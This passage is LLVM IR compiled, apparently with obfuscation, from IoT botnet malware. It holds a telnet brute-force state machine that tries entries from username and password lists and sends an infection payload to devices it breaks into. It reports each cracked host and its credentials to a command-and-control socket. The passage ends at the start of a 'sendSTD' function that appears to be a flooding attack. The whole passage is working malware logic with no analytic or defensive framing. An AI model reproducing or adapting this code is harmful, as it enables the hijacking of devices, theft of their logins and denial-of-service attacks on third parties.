  %363 = xor i32 -2049, -1
  %364 = xor i32 1963536852, -1
  %365 = or i32 %362, %363
  %366 = or i32 1963536852, %364
  %367 = xor i32 %365, -1
  %368 = and i32 %367, %366
  %369 = and i32 %361, -2049
  %370 = call i32 (i32, i32, ...) @fcntl(i32 %355, i32 4, i32 %368)
  %371 = load i32, i32* %5, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %372
  call void @advance_state(%struct.telstate_t* %373, i32 2)
  br label %374

; <label>:374:                                    ; preds = %350, %346
  br label %817

; <label>:375:                                    ; preds = %285
  %376 = load i32, i32* %6, align 4
  %377 = icmp eq i32 %376, -1
  br i1 %377, label %378, label %382

; <label>:378:                                    ; preds = %375
  %379 = load i32, i32* %5, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %380
  call void @reset_telstate(%struct.telstate_t* %381)
  br label %817

; <label>:382:                                    ; preds = %375
  br label %383

; <label>:383:                                    ; preds = %382
  %384 = load i32, i32* %5, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %385
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %386, i32 0, i32 7
  %388 = load i32, i32* %387, align 16
  %389 = add i32 %388, -218631732
  %390 = add i32 %389, 5
  %391 = sub i32 %390, -218631732
  %392 = add i32 %388, 5
  %393 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %394 = icmp ult i32 %391, %393
  br i1 %394, label %395, label %399

; <label>:395:                                    ; preds = %383
  %396 = load i32, i32* %5, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %397
  call void @reset_telstate(%struct.telstate_t* %398)
  br label %399

; <label>:399:                                    ; preds = %395, %383
  br label %816

; <label>:400:                                    ; preds = %108
  %401 = load i32, i32* %5, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 0
  %405 = load i32, i32* %404, align 16
  %406 = load i32, i32* %3, align 4
  %407 = load i32, i32* %5, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %408
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %409, i32 0, i32 9
  %411 = load i8*, i8** %410, align 8
  %412 = call i32 @read_until_response(i32 %405, i32 %406, i8* %411, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %413 = icmp ne i32 %412, 0
  br i1 %413, label %414, label %431

; <label>:414:                                    ; preds = %400
  %415 = load i32, i32* %5, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %416
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %417, i32 0, i32 9
  %419 = load i8*, i8** %418, align 8
  %420 = call i32 @contains_fail(i8* %419)
  %421 = icmp ne i32 %420, 0
  br i1 %421, label %422, label %426

; <label>:422:                                    ; preds = %414
  %423 = load i32, i32* %5, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %424
  call void @advance_state(%struct.telstate_t* %425, i32 0)
  br label %430

; <label>:426:                                    ; preds = %414
  %427 = load i32, i32* %5, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %428
  call void @advance_state(%struct.telstate_t* %429, i32 3)
  br label %430

; <label>:430:                                    ; preds = %426, %422
  br label %817

; <label>:431:                                    ; preds = %400
  %432 = load i32, i32* %5, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 7
  %436 = load i32, i32* %435, align 16
  %437 = add i32 %436, -424076874
  %438 = add i32 %437, 7
  %439 = sub i32 %438, -424076874
  %440 = add i32 %436, 7
  %441 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %442 = icmp ult i32 %439, %441
  br i1 %442, label %443, label %447

; <label>:443:                                    ; preds = %431
  %444 = load i32, i32* %5, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %445
  call void @reset_telstate(%struct.telstate_t* %446)
  br label %447

; <label>:447:                                    ; preds = %443, %431
  br label %816

; <label>:448:                                    ; preds = %108
  %449 = load i32, i32* %5, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 0
  %453 = load i32, i32* %452, align 16
  %454 = load i32, i32* %5, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 4
  %458 = load i8, i8* %457, align 2
  %459 = zext i8 %458 to i64
  %460 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %459
  %461 = load i8*, i8** %460, align 8
  %462 = load i32, i32* %5, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 4
  %466 = load i8, i8* %465, align 2
  %467 = zext i8 %466 to i64
  %468 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %467
  %469 = load i8*, i8** %468, align 8
  %470 = call i64 @strlen(i8* %469) #10
  %471 = call i64 @send(i32 %453, i8* %461, i64 %470, i32 16384)
  %472 = icmp slt i64 %471, 0
  br i1 %472, label %473, label %477

; <label>:473:                                    ; preds = %448
  %474 = load i32, i32* %5, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %475
  call void @reset_telstate(%struct.telstate_t* %476)
  br label %817

; <label>:477:                                    ; preds = %448
  %478 = load i32, i32* %5, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 16
  %483 = call i64 @send(i32 %482, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i32 0, i32 0), i64 2, i32 16384)
  %484 = icmp slt i64 %483, 0
  br i1 %484, label %485, label %489

; <label>:485:                                    ; preds = %477
  %486 = load i32, i32* %5, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %487
  call void @reset_telstate(%struct.telstate_t* %488)
  br label %817

; <label>:489:                                    ; preds = %477
  %490 = load i32, i32* %5, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %491
  call void @advance_state(%struct.telstate_t* %492, i32 4)
  br label %816

; <label>:493:                                    ; preds = %108
  %494 = load i32, i32* %5, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 0
  %498 = load i32, i32* %497, align 16
  %499 = load i32, i32* %3, align 4
  %500 = load i32, i32* %5, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %501
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %502, i32 0, i32 9
  %504 = load i8*, i8** %503, align 8
  %505 = call i32 @read_until_response(i32 %498, i32 %499, i8* %504, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %506 = icmp ne i32 %505, 0
  br i1 %506, label %507, label %524

; <label>:507:                                    ; preds = %493
  %508 = load i32, i32* %5, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 9
  %512 = load i8*, i8** %511, align 8
  %513 = call i32 @contains_fail(i8* %512)
  %514 = icmp ne i32 %513, 0
  br i1 %514, label %515, label %519

; <label>:515:                                    ; preds = %507
  %516 = load i32, i32* %5, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %517
  call void @advance_state(%struct.telstate_t* %518, i32 0)
  br label %523

; <label>:519:                                    ; preds = %507
  %520 = load i32, i32* %5, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %521
  call void @advance_state(%struct.telstate_t* %522, i32 5)
  br label %523

; <label>:523:                                    ; preds = %519, %515
  br label %817

; <label>:524:                                    ; preds = %493
  %525 = load i32, i32* %5, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %526
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %527, i32 0, i32 7
  %529 = load i32, i32* %528, align 16
  %530 = sub i32 %529, 510805643
  %531 = add i32 %530, 3
  %532 = add i32 %531, 510805643
  %533 = add i32 %529, 3
  %534 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %535 = icmp ult i32 %532, %534
  br i1 %535, label %536, label %540

; <label>:536:                                    ; preds = %524
  %537 = load i32, i32* %5, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %538
  call void @reset_telstate(%struct.telstate_t* %539)
  br label %540

; <label>:540:                                    ; preds = %536, %524
  br label %816

; <label>:541:                                    ; preds = %108
  %542 = load i32, i32* %5, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 0
  %546 = load i32, i32* %545, align 16
  %547 = load i32, i32* %5, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 5
  %551 = load i8, i8* %550, align 1
  %552 = zext i8 %551 to i64
  %553 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %552
  %554 = load i8*, i8** %553, align 8
  %555 = load i32, i32* %5, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 5
  %559 = load i8, i8* %558, align 1
  %560 = zext i8 %559 to i64
  %561 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %560
  %562 = load i8*, i8** %561, align 8
  %563 = call i64 @strlen(i8* %562) #10
  %564 = call i64 @send(i32 %546, i8* %554, i64 %563, i32 16384)
  %565 = icmp slt i64 %564, 0
  br i1 %565, label %566, label %570

; <label>:566:                                    ; preds = %541
  %567 = load i32, i32* %5, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %568
  call void @reset_telstate(%struct.telstate_t* %569)
  br label %817

; <label>:570:                                    ; preds = %541
  %571 = load i32, i32* %5, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %572
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %573, i32 0, i32 0
  %575 = load i32, i32* %574, align 16
  %576 = call i64 @send(i32 %575, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i32 0, i32 0), i64 2, i32 16384)
  %577 = icmp slt i64 %576, 0
  br i1 %577, label %578, label %582

; <label>:578:                                    ; preds = %570
  %579 = load i32, i32* %5, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %580
  call void @reset_telstate(%struct.telstate_t* %581)
  br label %817

; <label>:582:                                    ; preds = %570
  %583 = load i32, i32* %5, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %584
  call void @advance_state(%struct.telstate_t* %585, i32 6)
  br label %816

; <label>:586:                                    ; preds = %108
  %587 = load i32, i32* %5, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 0
  %591 = load i32, i32* %590, align 16
  %592 = load i32, i32* %3, align 4
  %593 = load i32, i32* %5, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 9
  %597 = load i8*, i8** %596, align 8
  %598 = call i32 @read_until_response(i32 %591, i32 %592, i8* %597, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %599 = icmp ne i32 %598, 0
  br i1 %599, label %600, label %670

; <label>:600:                                    ; preds = %586
  %601 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %602 = load i32, i32* %5, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %603
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %604, i32 0, i32 7
  store i32 %601, i32* %605, align 16
  %606 = load i32, i32* %5, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %607
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %608, i32 0, i32 9
  %610 = load i8*, i8** %609, align 8
  %611 = call i32 @contains_fail(i8* %610)
  %612 = icmp ne i32 %611, 0
  br i1 %612, label %613, label %617

; <label>:613:                                    ; preds = %600
  %614 = load i32, i32* %5, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %615
  call void @advance_state(%struct.telstate_t* %616, i32 0)
  br label %669

; <label>:617:                                    ; preds = %600
  %618 = load i32, i32* %5, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 9
  %622 = load i8*, i8** %621, align 8
  %623 = call i32 @contains_success(i8* %622)
  %624 = icmp ne i32 %623, 0
  br i1 %624, label %625, label %664

; <label>:625:                                    ; preds = %617
  %626 = load i32, i32* %5, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 3
  %630 = load i8, i8* %629, align 1
  %631 = zext i8 %630 to i32
  %632 = icmp eq i32 %631, 2
  br i1 %632, label %633, label %637

; <label>:633:                                    ; preds = %625
  %634 = load i32, i32* %5, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %635
  call void @advance_state(%struct.telstate_t* %636, i32 7)
  br label %663

; <label>:637:                                    ; preds = %625
  %638 = load i32, i32* @mainCommSock, align 4
  %639 = load i32, i32* %5, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %640
  %642 = call i8* @get_telstate_host(%struct.telstate_t* %641)
  %643 = load i32, i32* %5, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 4
  %647 = load i8, i8* %646, align 2
  %648 = zext i8 %647 to i64
  %649 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %648
  %650 = load i8*, i8** %649, align 8
  %651 = load i32, i32* %5, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %652
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %653, i32 0, i32 5
  %655 = load i8, i8* %654, align 1
  %656 = zext i8 %655 to i64
  %657 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %656
  %658 = load i8*, i8** %657, align 8
  %659 = call i32 (i32, i8*, ...) @sockprintf(i32 %638, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.138, i32 0, i32 0), i8* %642, i8* %650, i8* %658)
  %660 = load i32, i32* %5, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %661
  call void @advance_state(%struct.telstate_t* %662, i32 7)
  br label %663

; <label>:663:                                    ; preds = %637, %633
  br label %668

; <label>:664:                                    ; preds = %617
  %665 = load i32, i32* %5, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %666
  call void @reset_telstate(%struct.telstate_t* %667)
  br label %668

; <label>:668:                                    ; preds = %664, %663
  br label %669

; <label>:669:                                    ; preds = %668, %613
  br label %817

; <label>:670:                                    ; preds = %586
  %671 = load i32, i32* %5, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 7
  %675 = load i32, i32* %674, align 16
  %676 = sub i32 %675, -59654232
  %677 = add i32 %676, 7
  %678 = add i32 %677, -59654232
  %679 = add i32 %675, 7
  %680 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %681 = icmp ult i32 %678, %680
  br i1 %681, label %682, label %686

; <label>:682:                                    ; preds = %670
  %683 = load i32, i32* %5, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %684
  call void @reset_telstate(%struct.telstate_t* %685)
  br label %686

; <label>:686:                                    ; preds = %682, %670
  br label %816

; <label>:687:                                    ; preds = %108
  %688 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %689 = load i32, i32* %5, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %690
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %691, i32 0, i32 7
  store i32 %688, i32* %692, align 16
  %693 = load i32, i32* %5, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 0
  %697 = load i32, i32* %696, align 16
  %698 = call i64 @send(i32 %697, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.139, i32 0, i32 0), i64 4, i32 16384)
  %699 = icmp slt i64 %698, 0
  br i1 %699, label %700, label %701

; <label>:700:                                    ; preds = %687
  br label %701

; <label>:701:                                    ; preds = %700, %687
  %702 = load i32, i32* %5, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 0
  %706 = load i32, i32* %705, align 16
  %707 = call i64 @send(i32 %706, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.140, i32 0, i32 0), i64 7, i32 16384)
  %708 = icmp slt i64 %707, 0
  br i1 %708, label %709, label %710

; <label>:709:                                    ; preds = %701
  br label %710

; <label>:710:                                    ; preds = %709, %701
  %711 = load i32, i32* %5, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %712
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %713, i32 0, i32 0
  %715 = load i32, i32* %714, align 16
  %716 = load i8*, i8** @infect, align 8
  %717 = load i8*, i8** @infect, align 8
  %718 = call i64 @strlen(i8* %717) #10
  %719 = call i64 @send(i32 %715, i8* %716, i64 %718, i32 16384)
  %720 = icmp slt i64 %719, 0
  br i1 %720, label %721, label %747

; <label>:721:                                    ; preds = %710
  %722 = load i32, i32* @mainCommSock, align 4
  %723 = load i32, i32* %5, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %724
  %726 = call i8* @get_telstate_host(%struct.telstate_t* %725)
  %727 = load i32, i32* %5, align 4
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 4
  %731 = load i8, i8* %730, align 2
  %732 = zext i8 %731 to i64
  %733 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %732
  %734 = load i8*, i8** %733, align 8
  %735 = load i32, i32* %5, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %736
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %737, i32 0, i32 5
  %739 = load i8, i8* %738, align 1
  %740 = zext i8 %739 to i64
  %741 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %740
  %742 = load i8*, i8** %741, align 8
  %743 = call i32 (i32, i8*, ...) @sockprintf(i32 %722, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.141, i32 0, i32 0), i8* %726, i8* %734, i8* %742)
  %744 = load i32, i32* %5, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %745
  call void @reset_telstate(%struct.telstate_t* %746)
  br label %817

; <label>:747:                                    ; preds = %710
  %748 = load i32, i32* %5, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %749
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %750, i32 0, i32 7
  %752 = load i32, i32* %751, align 16
  %753 = sub i32 0, 25
  %754 = sub i32 %752, %753
  %755 = add i32 %752, 25
  %756 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %757 = icmp ult i32 %754, %756
  br i1 %757, label %758, label %815

; <label>:758:                                    ; preds = %747
  %759 = load i32, i32* @mainCommSock, align 4
  %760 = load i32, i32* %5, align 4
  %761 = sext i32 %760 to i64
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %761
  %763 = call i8* @get_telstate_host(%struct.telstate_t* %762)
  %764 = load i32, i32* %5, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 4
  %768 = load i8, i8* %767, align 2
  %769 = zext i8 %768 to i64
  %770 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %769
  %771 = load i8*, i8** %770, align 8
  %772 = load i32, i32* %5, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 5
  %776 = load i8, i8* %775, align 1
  %777 = zext i8 %776 to i64
  %778 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %777
  %779 = load i8*, i8** %778, align 8
  %780 = call i32 (i32, i8*, ...) @sockprintf(i32 %759, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.142, i32 0, i32 0), i8* %763, i8* %771, i8* %779)
  %781 = load i32, i32* %5, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 3
  %785 = load i8, i8* %784, align 1
  %786 = zext i8 %785 to i32
  %787 = icmp ne i32 %786, 3
  br i1 %787, label %788, label %811

; <label>:788:                                    ; preds = %758
  %789 = load i32, i32* @mainCommSock, align 4
  %790 = load i32, i32* %5, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %791
  %793 = call i8* @get_telstate_host(%struct.telstate_t* %792)
  %794 = load i32, i32* %5, align 4
  %795 = sext i32 %794 to i64
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %795
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %796, i32 0, i32 4
  %798 = load i8, i8* %797, align 2
  %799 = zext i8 %798 to i64
  %800 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %799
  %801 = load i8*, i8** %800, align 8
  %802 = load i32, i32* %5, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 5
  %806 = load i8, i8* %805, align 1
  %807 = zext i8 %806 to i64
  %808 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %807
  %809 = load i8*, i8** %808, align 8
  %810 = call i32 (i32, i8*, ...) @sockprintf(i32 %789, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.143, i32 0, i32 0), i8* %793, i8* %801, i8* %809)
  br label %811

; <label>:811:                                    ; preds = %788, %758
  %812 = load i32, i32* %5, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %813
  call void @reset_telstate(%struct.telstate_t* %814)
  br label %815

; <label>:815:                                    ; preds = %811, %747
  br label %816

; <label>:816:                                    ; preds = %815, %686, %582, %540, %489, %447, %399, %273, %108
  br label %817

; <label>:817:                                    ; preds = %816, %721, %669, %578, %566, %523, %485, %473, %430, %378, %374, %223, %192, %179
  %818 = load i32, i32* %5, align 4
  %819 = sub i32 %818, 166447428
  %820 = add i32 %819, 1
  %821 = add i32 %820, 166447428
  %822 = add nsw i32 %818, 1
  store i32 %821, i32* %5, align 4
  br label %91

; <label>:823:                                    ; preds = %91
  br label %89
                                                  ; No predecessors!
  ret void
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
